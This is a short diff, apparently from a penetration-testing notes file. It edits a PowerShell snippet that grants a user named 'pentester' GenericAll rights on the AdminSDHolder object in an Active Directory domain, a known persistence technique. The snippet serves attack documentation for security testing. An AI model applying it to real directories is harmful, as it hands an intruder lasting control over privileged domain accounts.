@@ -1611,7 +1611,7 @@ $MyAdmin = (get-aduser pentester).sid
 $MyDistinguishedName = "CN=AdminSDHolder,CN=System,DC=TECH,DC=LOCAL"
 $MyDistinguishedNameAD = $MyDistinguishedName = "AD:$MyDistinguishedName"
 $MyACL= Get-ACL $MyDistinguishedNameAD
-$MyADRights = [System.DirectoryServices.ActiveDirectoryRights] "GenericWrite"
+$MyADRights = [System.DirectoryServices.ActiveDirectoryRights] "Genericall"
 $MyType = [System.Security.AccessControl.AccessControlType] "Allow"
 $MyInheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "All"
 $MyACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $MyAdmin,$MyADRights,$MyType,$MyInheritanceType
